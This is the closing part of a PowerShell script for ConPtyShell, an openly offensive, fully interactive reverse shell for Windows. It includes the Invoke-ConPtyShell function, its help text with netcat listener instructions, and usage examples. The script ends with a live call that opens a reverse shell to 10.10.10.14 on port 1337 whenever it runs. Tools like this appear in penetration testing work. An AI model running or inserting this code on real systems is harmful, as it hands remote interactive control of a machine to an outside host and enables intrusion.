                [string] $commandLine = [ConPtyShellMainClass]::ParseCommandLine($arguments)

                $output = [ConPtyShell]::SpawnConPtyShell($remoteIp, $remotePort, $rows, $cols, $commandLine, $upgradeShell)
            } catch {
                Write-Host $_.Exception.ToString()
            }
        }

       return $output
    }
}

function Invoke-ConPtyShell
{   
    <#
        .SYNOPSIS
            ConPtyShell - Fully Interactive Reverse Shell for Windows 
            Author: splinter_code
            License: MIT
            Source: https://github.com/antonioCoco/ConPtyShell
        
        .DESCRIPTION
            ConPtyShell - Fully interactive reverse shell for Windows
            
            Properly set the rows and cols values. You can retrieve it from
            your terminal with the command "stty size".
            
            You can avoid to set rows and cols values if you run your listener
            with the following command:
                stty raw -echo; (stty size; cat) | nc -lvnp 3001
           
            If you want to change the console size directly from powershell
            you can paste the following commands:
                $width=80
                $height=24
                $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
                $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
            
            
        .PARAMETER RemoteIp
            The remote ip to connect
        .PARAMETER RemotePort
            The remote port to connect
        .PARAMETER Rows
            Rows size for the console
            Default: "24"
        .PARAMETER Cols
            Cols size for the console
            Default: "80"
        .PARAMETER CommandLine
            The commandline of the process that you are going to interact
            Default: "powershell.exe"
            
        .EXAMPLE  
            PS>Invoke-ConPtyShell 10.0.0.2 3001
            
            Description
            -----------
            Spawn a reverse shell

        .EXAMPLE
            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
            
            Description
            -----------
            Spawn a reverse shell with specific rows and cols size
            
         .EXAMPLE
            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
            
            Description
            -----------
            Spawn a reverse shell (cmd.exe) with specific rows and cols size
            
        .EXAMPLE
            PS>Invoke-ConPtyShell -Upgrade -Rows 30 -Cols 90
            
            Description
            -----------
            Upgrade your current shell with specific rows and cols size
            
    #>
    Param
    (
        [Parameter(Position = 0)]
        [String]
        $RemoteIp,
        
        [Parameter(Position = 1)]
        [String]
        $RemotePort,

        [Parameter()]
        [String]
        $Rows = "24",

        [Parameter()]
        [String]
        $Cols = "80",

        [Parameter()]
        [String]
        $CommandLine = "powershell.exe",
        
        [Parameter()]
        [Switch]
        $Upgrade
    )
    
    if( $PSBoundParameters.ContainsKey('Upgrade') ) {
        $RemoteIp = "upgrade"
        $RemotePort = "shell"
    }
    else{
  
        if(-Not($PSBoundParameters.ContainsKey('RemoteIp'))) {
            throw "RemoteIp missing parameter"
        }
        
        if(-Not($PSBoundParameters.ContainsKey('RemotePort'))) {
            throw "RemotePort missing parameter"
        }
    }
    $parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
    $output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)
    Write-Output $output
}

Invoke-ConPtyShell 10.10.10.14 1337
